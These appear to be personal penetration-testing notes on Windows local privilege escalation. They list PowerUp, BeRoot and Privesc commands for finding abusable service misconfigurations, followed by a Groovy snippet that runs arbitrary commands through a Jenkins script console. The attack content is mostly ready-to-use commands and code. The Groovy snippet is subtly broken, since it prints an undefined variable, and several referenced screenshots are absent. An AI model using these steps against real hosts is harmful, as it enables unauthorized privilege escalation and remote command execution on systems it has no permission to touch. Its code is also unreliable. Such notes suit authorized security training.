### Local Privilege Escalation
![[Pasted image 20210807092155.png]]

We are going to use PowerUp for privilege escalation and look for misconfiguration in services. To load PowerUp Download PowerUp and load it `. .\PowerUp.ps1`
Below are some following commands to look for service misconfiguration

You can download it from here
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

##### Service Abuse

```powershell
# Get services with unquoted paths and spaces in their name.
Get-ServiceUnquoted -Verbose # PowerUp

# Get services where the current user can write to its binary path or change arguments to the binary 
Get-ModifiableServiceFile -Verbose # PowerUp

# Get the services whose configuration current user can modify
Get-ModifiableService -Verbose # PowerUp

# Run All checks
Invoke-AllChecks # PowerUp
.\beRoot.exe # BeRoot
Invoke-Privesc # Privesc
```

##### Feature Abuse

![[Pasted image 20210807095602.png]]

![[Pasted image 20210807095806.png]]

If you have admin privileges you can browse to` http://<jenkins server>/script` and run groovy scripts in the machine

```Groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[Insert Command]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $err"
```

If you don't have admin privileges
![[Pasted image 20210807101147.png]]